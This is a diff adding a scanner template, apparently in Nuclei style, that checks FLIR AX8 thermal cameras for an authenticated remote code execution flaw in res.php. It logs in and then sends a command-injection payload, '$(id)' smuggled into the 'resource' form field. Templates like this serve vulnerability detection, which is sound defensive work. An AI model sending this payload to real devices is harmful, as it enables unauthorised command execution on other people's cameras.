@@ -1,0 +1,35 @@
+id: flir-ax8-rce
+brief:
+    title: FLIR-AX8 res.php - Remote Code Execution
+    by: momika233
+    level: critical
+    about: Remote Command Execution vulnerability in the FLIR-AX8 res.php file, the attacker obtains server permissions after logging in to the background with the default password.
+    label:
+        - flir-ax8
+        - rce
+        - exploitdb
+        - iot
+        - sensor
+        - authenticated
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/login/dologin'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: user_name={{username}}&user_password={{password}}
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/res.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: action=node&resource=$(id)
+      signs:
+        - "on": status
+          status:
+            - 200
